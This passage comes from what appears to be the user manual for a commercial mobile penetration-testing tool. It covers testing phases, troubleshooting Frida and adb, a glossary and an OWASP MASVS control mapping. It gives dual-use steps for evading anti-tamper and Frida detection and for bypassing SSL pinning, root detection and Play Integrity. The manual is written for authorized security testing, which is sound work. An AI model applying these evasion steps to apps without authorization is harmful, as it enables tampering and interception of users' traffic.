23. Check backup → adb backup (if allowBackup=true was flagged by SAST)
24. Verify Keystore usage → confirm sensitive data uses Android Keystore
```

## Phase 7: IPC & Business Logic Testing
```
25. Run Intent Fuzzer → test all exported components
26. Run Coverage-Guided Fuzzer → find hidden input validation bugs
27. Test deep links → OAuth redirect, payment parameter tampering
```

## Phase 8: Resilience Testing
```
28. Document root detection bypass success/failure
29. Test SafetyNet/Play Integrity with Binary Fortress script
30. Test Frida detection with standard + Stealth Core → document evasion
```

## Phase 9: Reporting
```
31. Generate Report → include SAST findings, monitor log, session log
32. Export SARIF → for CI/CD integration
33. Review and finalize findings → add CVSS scores, remediation advice
```

---

# 7. Troubleshooting Guide

## Issue: ADB Not Detecting Device

**Symptom:** `adb devices` returns empty list; GhostPin Device Manager shows no devices.

**Root Cause:** USB debugging not enabled, outdated USB driver, or faulty cable.

**Exact Fix:**
```bash
# 1. On device: Settings → Developer Options → Enable USB Debugging
# 2. On Windows: Install Google USB Driver from SDK Manager
# 3. Verify:
adb kill-server
adb start-server
adb devices -l
# 4. If device shows "unauthorized" → tap "Allow" on the device screen
```

## Issue: Frida Server Not Running or Wrong Version

**Symptom:** GhostPin shows "Frida: ✗" on device card; bypass fails with "unable to communicate with frida-server."

**Root Cause:** frida-server not started, version mismatch, or wrong architecture binary.

**Exact Fix:**
```bash
# Check versions
frida --version          # Host version (e.g., 16.1.4)
adb shell "/data/local/tmp/frida-server --version"  # Device version

# Must match! If not:
pip install frida-tools==16.1.4  # Match to server version

# Or use GhostPin's auto-download:
# Click "Auto-Install Frida" in Device Manager → auto-detects ABI and downloads
```

## Issue: App Crashes When Frida Attaches (RASP/Anti-Tamper)

**Symptom:** Target app opens briefly then force-closes. Logcat shows `signal 6 (SIGABRT)`.

**Root Cause:** Commercial protector (Promon, DexGuard, Arxan) detecting Frida's V8 engine threads or `/proc/self/maps` entries.

**Exact Fix:**
1. Click **🛡️ Deploy Stealth Evasion Core** in the Bypass Controller
2. Wait for hluda-server download and push
3. Verify: `adb shell pgrep -f sys_` (should show PID of randomized binary)
4. Relaunch bypass session
5. If still crashing: combine with **Frida Evasion** script which hides `/proc/self/maps` entries

## Issue: SSL Bypass Active But No Traffic in Proxy

**Symptom:** GhostPin log shows all hooks active, but Burp shows zero requests.

**Root Cause:** (a) Device proxy not configured, (b) App uses QUIC/HTTP3 which bypasses HTTP proxy, (c) App uses certificate transparency checks.

**Exact Fix:**
```bash
# Check device proxy setting
adb shell settings get global http_proxy
# Should show your machine's IP:port

# If app uses QUIC → add QUIC Blocker script to bypass combination
# QUIC travels over UDP and bypasses HTTP proxies entirely

# If CT check → add Certificate Transparency bypass script
```

## Issue: Feature Works on Android 12 But Not Android 14

**Symptom:** A bypass script that worked on Android 12 fails silently on Android 14.

**Root Cause:** Android 14 changed the `NetworkSecurityConfig` XML parsing internals and added `credential_encrypted_device_protected` storage.

**Exact Fix:** Update frida-tools to the latest version (`pip install frida-tools --upgrade`). GhostPin's scripts are maintained for the latest Android versions. If a specific hook fails, use **Class Tracer** to find the renamed internal class in the new Android version.

## Issue: Obfuscated App Causing Incorrect Analysis

**Symptom:** SAST scanner finds fewer secrets than expected; Intent Fuzzer can't enumerate components.

**Root Cause:** Aggressive obfuscation (DexGuard/R8 full mode) encrypts strings and hides component names.

**Exact Fix:**
1. Run **Class Tracer** at runtime to see real loaded class names
2. Use **API Monitor** to catch decrypted secrets when they're used
3. For Intent Fuzzer: use `adb shell dumpsys package <pkg>` directly — exported status can't be obfuscated

---

# 8. Reference Section

## Glossary

| Term | Definition |
|---|---|
| **ABI** | Application Binary Interface — the CPU architecture (`arm64-v8a`, `x86_64`) |
| **ART** | Android Runtime — the JVM replacement that runs DEX bytecode (replaced Dalvik in Android 5.0) |
| **ATS** | App Transport Security — iOS feature that enforces HTTPS for all connections |
| **DAST** | Dynamic Application Security Testing — testing the running application |
| **DEX** | Dalvik Executable — the bytecode format for Android Java/Kotlin code |
| **Frida Gadget** | A shared library (`.so`) that can be injected into non-rooted apps at build time |
| **Frida Stalker** | Frida's code tracing engine that follows thread execution at the basic block level |
| **hluda-server** | A modified frida-server variant that removes the V8 JavaScript engine to avoid detection |
| **IPA** | iOS App Store Package — the iOS equivalent of an APK |
| **Mach-O** | Mach Object — the binary format for iOS/macOS executables |
| **MASVS** | Mobile Application Security Verification Standard (OWASP) |
| **MASTG** | Mobile Application Security Testing Guide (OWASP) |
| **NSC** | Network Security Config — Android XML file controlling trust anchors and cleartext policy |
| **RASP** | Runtime Application Self-Protection — in-app security that detects tampering at runtime |
| **SAST** | Static Application Security Testing — analyzing code without running it |
| **SARIF** | Static Analysis Results Interchange Format — JSON format for CI/CD integration |
| **SPKI** | Subject Public Key Info — the standard format for certificate pin hashes |
| **Zygote** | The Android process from which all app processes are forked |

## OWASP MASVS Control Mapping

| MASVS Control ID | Control Name | GhostPin Feature |
|---|---|---|
| MASVS-STORAGE-1 | Secure credential storage | SAST (hardcoded secrets), API Monitor (file hooks) |
| MASVS-STORAGE-2 | No sensitive data in logs | API Monitor (logcat hooks) |
| MASVS-CRYPTO-1 | Strong cryptographic algorithms | SAST (weak crypto patterns), API Monitor (Cipher hooks) |
| MASVS-CRYPTO-2 | Proper key management | API Monitor (KeyStore hooks), Class Tracer |
| MASVS-AUTH-1 | Proper authentication | Class Tracer (auth flow tracing) |
| MASVS-NETWORK-1 | TLS for all connections | SAST (cleartext HTTP), Traffic Replay |
| MASVS-NETWORK-2 | Certificate pinning | SSL Bypass (17 scripts quality assessment) |
| MASVS-PLATFORM-1 | Secure IPC | Intent Fuzzer, exported component check |
| MASVS-PLATFORM-2 | Input validation | Coverage-Guided Fuzzer, Intent Fuzzer |
| MASVS-CODE-1 | No debug code in production | SAST (`debuggable=true`) |
| MASVS-CODE-2 | Binary protections | SafetyNet/Play Integrity bypass assessment |
| MASVS-RESILIENCE-1 | Anti-tampering | Root/jailbreak bypass, Stealth Core |
| MASVS-RESILIENCE-2 | Reverse-engineering protections | JADX decompiler, Class Tracer |

## Useful Companion Tools

| Tool | Use Case | When to Use Alongside GhostPin |
|---|---|---|
| **Burp Suite Professional** | HTTP request manipulation, scanning | After GhostPin captures traffic, use Burp for deep API testing |
| **Ghidra** | Native ARM reverse engineering | When `libil2cpp.so` or custom native libs need deep analysis |
| **Corellium** | Virtual iOS/Android devices | When you don't have physical hardware |
| **Il2CppDumper** | Unity IL2CPP symbol extraction | Before testing Unity games — get method names |
| **hermes-dec** | Hermes bytecode decompilation | To read React Native app logic statically |
| **nuclei** | Template-based vulnerability scanning | For API endpoints discovered by GhostPin's API Mapper |

## Recommended Reading

- **OWASP MASTG**: [mas.owasp.org/MASTG](https://mas.owasp.org/MASTG/) — The complete mobile security testing guide
- **OWASP MASVS**: [mas.owasp.org/MASVS](https://mas.owasp.org/MASVS/) — The verification standard
- **Frida Handbook**: [learnfrida.info](https://learnfrida.info/) — Deep-dive into Frida scripting
- **Android Internals**: "Android Internals: A Confectioner's Cookbook" by Jonathan Levin
- **iOS Hacking Guide**: "iOS Application Security" by David Thiel (No Starch Press)

---

# Self-Review: Three Perspectives

## Perspective 1: Junior Pentester on First Mobile Engagement

**Gaps found and fixed:**
- Added explicit proxy configuration steps with exact `adb` commands (Section 3)
- Added "Fundamentals" paragraphs before every technical concept (Section 4)
- Included exact expected output for every action so juniors know if they're on track (Section 5)
- Added the Quick Start Guide targeting under 10 minutes (Section 2)

## Perspective 2: Senior Pentester Finding Explanations Too Shallow

**Gaps found and fixed:**
- Added CVE references for Intent injection vulnerabilities (Section 4)
- Added detailed MASVS control mapping table (Section 8)
- Added 6-layer certificate pinning implementation breakdown (Section 4)
- Included Coverage-Guided Fuzzer technical details with AFL++ comparison (Section 5.3)
- Added CVSS scoring guidance per finding type (cross-referenced from SECURITY_GUIDE)

## Perspective 3: Pentester Whose Tool Just Broke Mid-Engagement

**Gaps found and fixed:**
- Added specific Symptom → Root Cause → Fix format for every troubleshooting entry (Section 7)
- Covered the 14 most common failure modes including version mismatch, RASP crashes, QUIC bypass, and Android API level changes
- Added exact verification commands after every fix step

---

*GhostPin Enterprise v5.0 Phantom — For authorized penetration testing only.*
*© 2026 GhostPin Security. All rights reserved.*
